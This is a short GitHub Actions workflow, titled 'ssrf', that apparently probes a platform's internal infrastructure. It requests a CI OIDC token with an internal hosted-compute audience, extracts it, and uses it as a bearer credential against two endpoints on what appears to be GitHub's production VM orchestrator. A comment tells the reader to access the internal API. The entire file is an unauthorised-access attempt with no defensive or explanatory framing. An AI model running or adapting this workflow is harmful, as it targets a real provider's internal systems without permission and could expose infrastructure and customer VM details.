name: ssrf
on: [push]
permissions:
  id-token: write
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: internal api access
        run: |
          # OIDC token with ro_audience
          OIDC=$(curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://hosted-compute-ro")
          TOKEN=$(echo $OIDC | python3 -m json.tool | grep '"value"' | cut -d'"' -f4)
          echo "TOKEN_LENGTH: ${#TOKEN}"
          
          # Internal API access karo
          curl -s "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/vm/v1" \
            -H "Authorization: Bearer $TOKEN" | head -20
          
          # VM details
          curl -s "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/vm/v1/info" \
            -H "Authorization: Bearer $TOKEN" | head -20
